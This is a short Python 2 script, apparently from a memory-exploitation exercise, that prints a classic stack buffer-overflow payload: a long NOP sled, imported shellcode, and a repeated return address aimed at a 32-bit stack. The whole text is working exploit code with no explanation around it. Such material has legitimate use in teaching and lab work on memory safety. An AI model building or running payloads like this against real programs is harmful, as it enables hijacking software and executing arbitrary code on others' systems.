from shellcode import shellcode

def main():
    print (768 * '\x90') + shellcode + '\x90\x90\x90' + (56 * '\x01\xbb\xfe\xbf')

main()
